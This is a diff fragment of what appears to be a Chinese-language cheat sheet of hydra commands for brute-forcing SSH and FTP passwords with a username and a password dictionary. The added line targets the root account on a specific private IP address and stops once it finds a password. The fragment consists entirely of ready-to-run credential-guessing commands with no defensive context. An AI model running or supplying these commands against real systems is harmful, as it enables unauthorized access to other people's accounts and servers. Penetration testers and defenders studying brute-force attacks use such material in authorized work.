@@ -2,6 +2,7 @@
 1、破解ssh： 
 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
 hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
+hydra 192.168.0.100 ssh -l root -P /root/Desktop/1.txt -V -f #F获得密码结束
 2、破解ftp： 
 hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
 hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
